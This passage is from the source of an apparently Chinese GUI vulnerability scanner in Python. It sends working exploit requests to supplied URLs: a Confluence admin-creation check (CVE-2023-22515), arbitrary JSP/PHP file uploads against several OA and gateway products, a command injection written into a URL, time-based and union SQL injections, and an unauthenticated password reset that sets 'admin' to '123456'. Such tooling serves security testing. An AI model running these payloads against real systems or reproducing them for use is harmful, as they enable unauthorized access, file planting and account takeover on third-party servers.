                                            url_new = url

                                        encodetext = url_new + path
                                        data = f'''os_username={username}&os_password={password}&login=Log+in&os_destination=%2Findex.action'''
                                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                                        req5 = requests.post(encodetext, data=data, headers=headers, verify=False,timeout=20, proxies=proxies)

                                        if req5.status_code == 200:
                                            self.append_to_output(f"[+] 第五阶段已按照指定方式回显，准备进一步判断是否存在漏洞！！！！", "yellow")
                                            if url.endswith("/"):
                                                path = "welcome.action"
                                            else:
                                                path = "/welcome.action"

                                            if not url.startswith('http://') and not url.startswith('https://'):
                                                url_new = 'http://' + url
                                            else:
                                                url_new = url

                                            encodetext = url_new + path
                                            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                                            req6 = requests.get(encodetext, headers=headers, verify=False, timeout=20,proxies=proxies)

                                            if req6.status_code == 200 and 'Administration' in req6.text:
                                                self.append_to_output(f"[+] {url} 存在Confluence未授权管理用户添加 (CVE-2023-22515)！！！！", "red")
                                                self.append_to_output(f"[+] {url}/welcome.action 存在Confluence未授权管理用户添加 (CVE-2023-22515)\n 用户名:{username} 密码：{password}","yellow")
                                            else:
                                                self.append_to_output(f"[-] {url} 不存在Confluence未授权管理用户添加 (CVE-2023-22515)", "green")
                                        else:
                                            self.append_to_output(f"[-] {url} 不存在Confluence未授权管理用户添加 (CVE-2023-22515)","green")
                                    else:
                                        self.append_to_output(f"[-] {url} 不存在Confluence未授权管理用户添加 (CVE-2023-22515)","green")
                                else:
                                    self.append_to_output(f"[-] {url} 不存在Confluence未授权管理用户添加 (CVE-2023-22515)", "green")
                            else:
                                self.append_to_output(f"[-] {url} 不存在Confluence未授权管理用户添加 (CVE-2023-22515)", "green")
                        else:
                            self.append_to_output(f"[-] {url} 不存在Confluence未授权管理用户添加 (CVE-2023-22515)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                            self.append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
                        else:
                            self.append_to_output(str(e), "yellow")
                if vulnerability == "103.致远OA wpsAssistServlet接口存在任意文件上传漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Content-Type": "multipart/form-data; boundary=a4d7586ac9d50625dee11e86fa69bc71",
                    }
                    if url.endswith("/"):
                        path = "seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/01014.jsp&fileId=2"
                    else:
                        path = "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/01014.jsp&fileId=2"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url
                    data = '''--a4d7586ac9d50625dee11e86fa69bc71\r\nContent-Disposition: form-data; name="upload"; filename="123.xls"\r\nContent-Type: application/vnd.ms-excel\r\n\r\n<% out.println("215882935");%>\r\n--a4d7586ac9d50625dee11e86fa69bc71--'''

                    encodetext = url + path
                    self.append_to_output("===================================================================","green")
                    try:

                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=15, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'success' in res and 'code' in res:
                            self.append_to_output(f"[+] 第一阶段已按照指定方式回显，准备进一步判断是否存在漏洞！！！！", "red")
                            if url.endswith("/"):
                                path = "01014.jsp"
                            else:
                                path = "/01014.jsp"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url_new = 'http://' + url
                            else:
                                url_new = url
                            encodetext = url_new + path
                            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                            req = requests.get(encodetext, headers=headers, verify=False, timeout=5, proxies=proxies)
                            res = req.text
                            if req.status_code == 200 and '215882935' in res:
                                self.append_to_output(f"[+] {url} 存在致远OA wpsAssistServlet接口存在任意文件上传漏洞！！！！", "red")
                                self.append_to_output(res, "yellow")
                            else:
                                self.append_to_output(f"[-] {url} 不存在致远OA wpsAssistServlet接口存在任意文件上传漏洞", "green")
                        else:
                            self.append_to_output(f"[-] {url} 不存在致远OA wpsAssistServlet接口存在任意文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                            self.append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
                        else:
                            self.append_to_output(str(e), "yellow")
                if vulnerability == "102.致远oa前台密码修改(QVD-2023-21704)":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.667.76 Safari/537.36",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Content-Type": "application/json",
                    }
                    if url.endswith("/"):
                        path = "seeyon/rest/phoneLogin/phoneCode/resetPassword"
                    else:
                        path = "/seeyon/rest/phoneLogin/phoneCode/resetPassword"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url
                    data = '''{"loginName":"admin","password":"123456"}'''

                    encodetext = url + path
                    self.append_to_output("===================================================================","green")
                    try:

                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=15, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'success' in res and 'message' in res:
                            self.append_to_output(f"[+] {url} 存在致远oa前台密码修改(QVD-2023-21704)！！！！", "red")
                            #self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在致远oa前台密码修改(QVD-2023-21704)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                            self.append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
                        else:
                            self.append_to_output(str(e), "yellow")
                if vulnerability == "101.用友GRP-U8 SQL注入漏洞POST型":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "Content-Type":"application/x-www-form-urlencoded",
                    }
                    if url.endswith("/"):
                        path = "u8qx/bx_historyDataCheck.jsp"
                    else:
                        path = "/u8qx/bx_historyDataCheck.jsp"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url
                    data = '''userName=';WAITFOR DELAY '0:0:6'--&class.module.classLoader.DefaultAssertionStatus='''

                    encodetext = url + path
                    self.append_to_output("===================================================================","green")
                    try:
                        expected_time = 6  # 期望的回包时间，单位为秒
                        start_time = time.time()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=15, proxies=self.proxies)
                        res = req.text
                        end_time = time.time()

                        response_time = end_time - start_time
                        if response_time >= expected_time:
                            self.append_to_output(f"[+] {url} 存在用友GRP-U8 SQL注入漏洞POST型！！！！", "red")
                            #self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在用友GRP-U8 SQL注入漏洞POST型", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                            self.append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
                        else:
                            self.append_to_output(str(e), "yellow")
                if vulnerability == "100.用友GRP-U8 SQL注入漏洞GET型":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "Content-Type":"application/x-www-form-urlencoded",
                    }
                    if url.endswith("/"):
                        path = "u8qx/slbmbygr.jsp?gsdm=1%27;WAITFOR%20DELAY%20%270:0:5%27--"
                    else:
                        path = "/u8qx/slbmbygr.jsp?gsdm=1%27;WAITFOR%20DELAY%20%270:0:5%27--"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    self.append_to_output("===================================================================","green")
                    try:
                        expected_time = 5  # 期望的回包时间，单位为秒
                        start_time = time.time()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=self.proxies)
                        res = req.text
                        end_time = time.time()

                        response_time = end_time - start_time
                        if response_time >= expected_time:
                            self.append_to_output(f"[+] {url} 存在用友GRP-U8 SQL注入漏洞GET型！！！！", "red")
                            #self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在用友GRP-U8 SQL注入漏洞GET型", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                            self.append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
                        else:
                            self.append_to_output(str(e), "yellow")
                if vulnerability == "99.华测监测预警系统存在sql注入漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "Content-Type":"application/x-www-form-urlencoded",
                        "X-Requested-With": "XMLHttpRequest",
                        "Cookie": "PHPSESSID=3n9dv7r0vl6fcvirnlvp2oh1t4;",
                        "dashboroad": "srgua4gv7d2jnichvtl66l1146",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Encoding": "gzip,deflate,br",
                        "User-Agent": "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
                        "Connection": "Keep-alive",
                    }
                    if url.endswith("/"):
                        path = "Web/SysManage/UserEdit.aspx?&ID=0' ;WAITFOR%20DELAY%20'0:0:7' --"
                    else:
                        path = "/Web/SysManage/UserEdit.aspx?&ID=0' ;WAITFOR%20DELAY%20'0:0:7' --"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    self.append_to_output("===================================================================","green")
                    try:
                        expected_time = 7  # 期望的回包时间，单位为秒
                        start_time = time.time()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, headers=headers, verify=False, timeout=15, proxies=self.proxies)
                        res = req.text
                        end_time = time.time()

                        response_time = end_time - start_time
                        if response_time >= expected_time:
                            self.append_to_output(f"[+] {url} 存在华测监测预警系统存在sql注入漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在华测监测预警系统存在sql注入漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                            self.append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
                        else:
                            self.append_to_output(str(e), "yellow")
                if vulnerability == "98.金和OA前台任意文件上传漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "jc6/servlet/saveAsOtherFormatServlet?fileName=1.jsp"
                    else:
                        path = "/jc6/servlet/saveAsOtherFormatServlet?fileName=1.jsp"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        'Content-Encoding': 'deflate',
                        'Content-Disposition': 'attachment; filename="filename.jpg"',
                        'Content-Type': 'multipart/form-data; boundary=--***',
                        'Cookie': 'JSESSIONID=97C4A7E395765306FB923C3C7FB7DB42',
                        'Accept-Language': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Pragma': 'no-cache',
                        'Cache-Control': 'no-cache',
                        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
                    }

                    data = '''----***\r\nContent-Disposition: form-data;name="FileBlod";filename="1.jsp"\r\nContent-Type: image/jpeg\r\n\r\n<% out.println("This is JSP ");%>\r\n----***--'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200 and 'OK' in res:
                            self.append_to_output(f"[+] {url} 可能存在金和OA前台任意文件上传漏洞！！！！", "yellow")
                            if url.endswith("/"):
                                path = "jc6/upload/gwzw/1.jsp"
                            else:
                                path = "/jc6/upload/gwzw/1.jsp"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url_new = 'http://' + url
                            else:
                                url_new = url
                            encodetext = url_new + path
                            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                            req = requests.get(encodetext, headers=headers, verify=False, timeout=5, proxies=proxies)
                            res = req.text
                            if req.status_code == 200 and 'This is JSP' in res:
                                self.append_to_output(f"[+] {url} 存在金和OA前台任意文件上传漏洞！！！！", "red")
                                self.append_to_output(res, "yellow")
                            else:
                                self.append_to_output(f"[-] {url} 不存在金和OA前台任意文件上传漏洞", "green")
                        else:
                            self.append_to_output(f"[-] {url} 不存在金和OA前台任意文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "97.H2db console 未授权访问漏洞":
                    if url.endswith("/"):
                        path = "login.jsp?jsessionid=c3a385eefb360d01eb965b35795d93de"
                    else:
                        path = "/login.jsp?jsessionid=c3a385eefb360d01eb965b35795d93de"


                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'Connect' in res:
                            self.append_to_output(f"[+] {url} 存在H2db console 未授权访问漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在H2db console 未授权访问漏洞！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在H2db console 未授权访问漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "96.安恒信息明御安全网关存在任意文件上传漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1%7Cecho+%22415066557%22+%3E+.87919.php"
                    else:
                        path = "/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1%7Cecho+%22415066557%22+%3E+.87919.php"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Connection': 'close',
                        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                    }

                    data = '''--25c172e79b2758a7d7ff9fe9cab4a76d\r\nContent-Disposition: form-data; name="file"; filename="50514.asp"\r\nContent-Type: text/html\r\n\r\n578321995\r\n--25c172e79b2758a7d7ff9fe9cab4a76d--'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.get(encodetext, headers=headers, verify=False, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200 and 'success' in res:
                            self.append_to_output(f"[+] {url} 可能存在安恒信息明御安全网关存在任意文件上传漏洞！！！！", "yellow")
                            if url.endswith("/"):
                                path = "webui/.87919.php"
                            else:
                                path = "/webui/.87919.php"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url_new = 'http://' + url
                            else:
                                url_new = url
                            encodetext = url_new + path
                            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                            req = requests.get(encodetext, headers=headers, verify=False, timeout=5, proxies=proxies)
                            res = req.text
                            if req.status_code == 200 and '415066557' in res:
                                self.append_to_output(f"[+] {url} 存在安恒信息明御安全网关存在任意文件上传漏洞！！！！", "red")
                                self.append_to_output(res, "yellow")
                            else:
                                self.append_to_output(f"[-] {url} 不存在安恒信息明御安全网关存在任意文件上传漏洞", "green")
                        else:
                            self.append_to_output(f"[-] {url} 不存在安恒信息明御安全网关存在任意文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "95.安美数字酒店宽带运营系统SQL注入漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "Content-Type":"application/x-www-form-urlencoded",
                        "X-Requested-With": "XMLHttpRequest",
                        "Cookie": "PHPSESSID=3n9dv7r0vl6fcvirnlvp2oh1t4;",
                        "dashboroad": "srgua4gv7d2jnichvtl66l1146",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Encoding": "gzip,deflate,br",
                        "User-Agent": "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
                        "Connection": "Keep-alive",
                    }
                    data='''EditStatus=1&LangEName=pHqghUme&LangID=1&LangName=pHqghUme&LangType=0000%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF&Lately=555-666-0606&Search=the&SerialID=1&Type=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z&UID=add&submit=%20%E6%B7%BB%20%E5%8A%A0%20'''
                    if url.endswith("/"):
                        path = "language.php"
                    else:
                        path = "/language.php"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        expected_time = 5  # 期望的回包时间，单位为秒
                        start_time = time.time()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=15, proxies=self.proxies)
                        res = req.text
                        end_time = time.time()

                        response_time = end_time - start_time
                        if response_time >= expected_time:
                            self.append_to_output(f"[+] {url} 存在安美数字酒店宽带运营系统SQL注入漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在安美数字酒店宽带运营系统SQL注入漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                            self.append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
                        else:
                            self.append_to_output(str(e), "yellow")
                if vulnerability == "94.泛微e-office系统存在SQL注入漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "E-mobile/App/Init.php?m=getSelectList_Crm"
                    else:
                        path = "/E-mobile/App/Init.php?m=getSelectList_Crm"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept': '*/*',
                        'Connection': 'close',
                        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                        'Content-Type': 'application/x-www-form-urlencoded',
                    }

                    data = '''cc_parent_id=-999 /*!50000union*/ /*!50000select*/ 1,user()#'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'CC_NAME' in res:
                            self.append_to_output(f"[+] {url} 存在泛微e-office系统存在SQL注入漏洞！！！！", "red")
                            self.append_to_output(f"[-] 回显的内容为：\n {res} ", "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在泛微e-office系统存在SQL注入漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "93.蓝凌EIS智慧协同平台saveImg接口任意文件上传漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "eis/service/api.aspx?action=saveImg"
                    else:
                        path = "/eis/service/api.aspx?action=saveImg"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Connection': 'close',
                        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                        'Upgrade-Insecure-Requests': '1',
                        'Content-Type': 'multipart/form-data; boundary=25c172e79b2758a7d7ff9fe9cab4a76d',
                    }

                    data = '''--25c172e79b2758a7d7ff9fe9cab4a76d\r\nContent-Disposition: form-data; name="file"; filename="50514.asp"\r\nContent-Type: text/html\r\n\r\n578321995\r\n--25c172e79b2758a7d7ff9fe9cab4a76d--'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 可能存在蓝凌EIS智慧协同平台saveImg接口任意文件上传漏洞！！！！", "yellow")
                            if url.endswith("/"):
                                path = res
                            else:
                                path = res

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url_new = 'http://' + url
                            else:
                                url_new = url
                            encodetext = url_new + path
                            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=self.proxies)
                            res = req.text
                            if req.status_code == 200 and '578321995' in res:
                                self.append_to_output(f"[+] {url} 存在蓝凌EIS智慧协同平台saveImg接口任意文件上传漏洞！！！！", "red")
                                self.append_to_output(res, "yellow")
                            else:
                                self.append_to_output(f"[-] {url} 不存在蓝凌EIS智慧协同平台saveImg接口任意文件上传漏洞", "green")
                        else:
                            self.append_to_output(f"[-] {url} 不存在蓝凌EIS智慧协同平台saveImg接口任意文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "92.EasyCVR 视频管理平台存在信息泄露":
                    if url.endswith("/"):
                        path = "api/v1/userlist?pageindex=0&pagesize=10"
                    else:
                        path = "/api/v1/userlist?pageindex=0&pagesize=10"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
                        "Accept": "*/*",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "close"
                    }
                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, verify=False, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在EasyCVR 视频管理平台存在信息泄露！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在EasyCVR 视频管理平台存在信息泄露", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "91.成都海翔软件有限公司海翔药业云平台存在sql注入":
                    if url.endswith("/"):
                        path = "getylist_login.do"
                    else:
                        path = "/getylist_login.do"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    headers = {
                        "Accept": "*/*",
                        "X-Requested-With": "XMLHttpRequest",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "Origin": "http://127.0.0.1",
                        "Referer": "http://127.0.0.1/",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.9",
                        "Cookie": "JSESSIONID=FAE14B13415BA359B95FE239A9272270; __session:0.4635490933257511:=http:",
                        "Connection": "close"
                    }

                    data = {"accountname": "1"}

                    try:
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, headers=headers, data=data, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200:
                            data = {"accountname": "1'"}
                            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                            req = requests.post(encodetext, headers=headers, data=data, timeout=5, proxies=self.proxies)
                            res = req.text
                            if req.status_code == 500:
                                self.append_to_output(f"[+] {url} 存在成都海翔软件有限公司海翔药业云平台存在sql注入！！！！", "red")
                                #self.append_to_output(res, "yellow")
                                # 构造HTTP请求数据
                                endurl = "/getylist_login.do"
                                data = {"accountname": "1"}
                                headers = {
                                    "Host": url,
                                    "Accept": "*/*",
                                    "X-Requested-With": "XMLHttpRequest",
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
                                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                                    "Origin": "http://127.0.0.1",
                                    "Referer": "http://127.0.0.1/",
                                    "Accept-Encoding": "gzip, deflate",
                                    "Accept-Language": "zh-CN,zh;q=0.9",
                                    "Cookie": "JSESSIONID=FAE14B13415BA359B95FE239A9272270; __session:0.4635490933257511:=http:",
                                    "Connection": "close"
                                }
                                http_request = f"POST {endurl} HTTP/1.1\n"
                                for header, value in headers.items():
                                    http_request += f"{header}: {value}\n"
                                http_request += "\n"
                                http_request += "&".join([f"{key}={value}" for key, value in data.items()])

                                # 保存发送的HTTP请求数据到txt文件
                                with open("http_request.txt", "w") as file:
                                    file.write(http_request)

                                with open("output.txt", "a") as file:
                                    file.write(f"[+] {url} 存在成都海翔软件有限公司海翔药业云平台存在sql注入！！！！" + "\n")
                                    file.write(res + "\n")
                            else:
                                self.append_to_output(f"[-] {url} 不存在成都海翔软件有限公司海翔药业云平台存在sql注入", "green")
                        else:
                            self.append_to_output(f"[-] {url} 不存在成都海翔软件有限公司海翔药业云平台存在sql注入", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        if 'SSLError' in str(e):
                            self.append_to_output(f"[!] 该 {url} 证书校验错误", "yellow")
                        else:
                            self.append_to_output(str(e), "yellow")
                if vulnerability == "1.宏景HCM categories SQL注入(CNVD-2023-08743)":
                    if url.endswith("/"):
                        path = "servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2cdb~5fname~28~29~2d~2d&codesetid=1&flag=c&parentid=-1&status=1"
                    else:
                        path = "/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2cdb~5fname~28~29~2d~2d&codesetid=1&flag=c&parentid=-1&status=1"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'hellohongjingHcm' in res:
                            self.append_to_output(f"[+] {url} 存在宏景HCM categories SQL注入！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在宏景HCM categories SQL注入！！！！" + "\n")
                                file.write(res + "\n")
                        else:
